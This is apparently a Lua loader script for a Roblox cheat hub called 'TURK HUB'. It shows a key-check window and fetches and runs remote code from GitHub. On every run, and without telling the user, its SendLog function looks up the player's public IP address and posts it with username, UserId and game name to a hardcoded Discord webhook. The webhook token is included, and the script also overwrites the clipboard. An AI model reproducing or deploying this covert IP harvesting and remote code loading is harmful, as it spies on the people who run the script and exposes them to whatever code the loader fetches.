if getgenv().TURKHUB_LOADED then return end
getgenv().TURKHUB_LOADED = true

if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Whitelist Player
local WhitelistPlayers = {
    "maytawin29",
    "maytawin_test"
}

-- Links
local Discord = "https://discord.com/invite/v3dAeMKp4N"
local KeyURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/KEY"
local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"

-- Webhooks
local RunWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"

-- HTTP Request function (รองรับหลาย executor)
local request = syn and syn.request or http_request or request

-- Get IP
local function GetIP()
    local ip = "Unknown"
    pcall(function()
        ip = game:HttpGet("https://api.ipify.org")
    end)
    return ip
end

-- Send Discord Log
local function SendLog()

    if not request then return end

    local ip = GetIP()

    local data = {
        ["embeds"] = {{
            ["title"] = "🧠 TURK HUB EXECUTED",
            ["color"] = 3066993,
            ["fields"] = {
                {
                    ["name"] = "Player",
                    ["value"] = LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "UserId",
                    ["value"] = tostring(LocalPlayer.UserId),
                    ["inline"] = true
                },
                {
                    ["name"] = "IP Address",
                    ["value"] = ip,
                    ["inline"] = false
                },
                {
                    ["name"] = "Game",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = false
                }
            }
        }}
    }

    request({
        Url = RunWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })

end

-- ส่ง Log ตอนรัน
pcall(SendLog)

-- Check Whitelist
for _,name in pairs(WhitelistPlayers) do
    if LocalPlayer.Name == name then
        loadstring(game:HttpGet(LoaderURL))()
        return
    end
end

-- Copy discord
pcall(function()
    setclipboard(Discord)
end)

-- Load UI
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Get Keys
local function GetKeys()

    local data = ""
    pcall(function()
        data = game:HttpGet(KeyURL)
    end)

    local keys = {}

    for line in string.gmatch(data,"[^\r\n]+") do
        table.insert(keys,line)
    end

    return keys
end

local ValidKeys = GetKeys()

-- Window
local Window = Rayfield:CreateWindow({
    Name = "TURK HUB | Key System",
    LoadingTitle = "TURK HUB",
    LoadingSubtitle = "Secure Loader",
    Theme = "DarkBlue"
})

local KeyTab = Window:CreateTab("Authentication","lock")

local UserKey = ""

KeyTab:CreateInput({
    Name = "Enter Key",
    PlaceholderText = "Paste your key here",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        UserKey = Text
    end
})

KeyTab:CreateButton({
    Name = "Submit Key",
    Callback = function()

        local Valid = false

        for _,k in pairs(ValidKeys) do
            if UserKey == k then
                Valid = true
                break
            end
        end

        if Valid then

            Rayfield:Notify({
                Title = "Access Granted",
                Content = "Loading Hub...",
                Duration = 4
            })

            wait(1)

            loadstring(game:HttpGet(LoaderURL))()

            Rayfield:Destroy()

        else

            pcall(function()
                setclipboard(Discord)
            end)

            Rayfield:Notify({
                Title = "Invalid Key",
                Content = "Join our Discord to get key (copied)",
                Duration = 5
            })

        end

    end
})

KeyTab:CreateButton({
    Name = "Copy Discord Invite",
    Callback = function()

        pcall(function()
            setclipboard(Discord)
        end)

        Rayfield:Notify({
            Title = "Copied",
            Content = "Discord link copied",
            Duration = 3
        })

    end
})